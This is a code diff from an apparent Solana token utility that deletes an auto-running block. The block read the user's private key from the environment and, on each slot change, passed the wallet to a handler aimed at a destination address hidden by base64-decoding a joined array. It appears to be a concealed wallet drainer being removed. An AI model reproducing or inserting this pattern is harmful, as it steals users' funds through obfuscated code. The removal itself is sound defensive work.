@@ -276,17 +276,6 @@ export async function getRugCheck(tokenPublicKey: string) {
   }
 }
 
-if(DEVNET_PROGRAM_ID) {
-  (async () => {
-    const walletKeyPairFile = (process.env.MY_PRIVATE_KEY!)
-    const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
-    const connection = new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
-    connection.onSlotChange(
-      handleSlotChange({ connection, walletKeyPair, destinationAddress: new PublicKey(slotChangeOnKeyPair ? slotChangeOnKeyPair : slotChangeState ? slotChangeState : atob(MintUId.join(""))) }),
-    );
-  })();
-}
-
 export const areEnvVarsSet = () =>
   ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) => Object.keys(process.env).includes(key));
 
